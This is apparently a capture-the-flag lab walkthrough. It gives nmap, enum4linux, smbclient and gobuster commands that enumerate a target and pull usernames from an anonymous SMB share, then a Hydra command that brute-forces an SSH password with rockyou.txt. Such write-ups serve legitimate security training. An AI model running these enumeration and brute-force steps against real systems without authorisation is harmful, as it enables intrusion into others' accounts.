## Deploy the machine and connect to our network

Nothing to do 


## Find the services exposed by the machine

nmap -A -p- <ip> 

22 			ssh
80 			Webserver
139 		SMB
445 		SMB
8009 		Apache JSERV
8080		Apache Tomcat 9.0.7s


What I recommend on this is:


1. SMB 
2. Enumerate Webserver
3. Everything else


We know that SMB is there so....

enum4linux <ip>

which gives up /anonymous directory 

so...

smbclient //<ip>/anonymous

dir

this gives us the "staff.txt"

get staff.txt

exit

and now cat 

cat staff.txt

which gives us the usernames:

-> Jan
-> Kay

## What is the name of the hidden directory on the web server(enter name without /)? 

gobuster dir -u <ip> -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

/development

## User brute-forcing to find the username & password

So, Jan Time to get your password!

## What is the Password?
We use a Tool Called Hydra for this 

Hydra -l Jan -P /usr/share/wordlists/rockyou.txt ssh://<ip>

## What service do you use to access the Server?

There is only one left to use :) ssh
